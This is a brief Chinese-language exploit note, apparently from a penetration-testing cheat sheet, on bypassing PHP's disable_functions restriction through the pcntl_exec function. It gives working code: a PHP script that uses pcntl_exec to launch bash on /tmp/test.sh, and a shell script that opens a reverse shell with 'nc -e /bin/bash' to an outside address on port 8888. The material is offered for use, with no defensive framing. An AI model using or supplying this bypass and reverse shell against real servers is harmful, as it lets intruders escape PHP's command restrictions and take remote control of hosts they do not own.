## ***利用 pcntl_exec 绕过***

**1\. 前提条件**

PHP安装并启用了pcntl插件

**2\. 基本原理**

利用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令，从而绕过disable_functions

**3\. exp**

> exp.php

```php
#利用pcntl_exec()执行test.sh
<?php
if(function_exists('pcntl_exec')) {
  pcntl_exec("/bin/bash", array("/tmp/test.sh"));
} else {
    echo 'pcntl extension is not support!';
}
?>

```

> test.sh

```bash
#!/bin/bash
nc -e /bin/bash 1.1.1.1 8888    #反弹shell

```

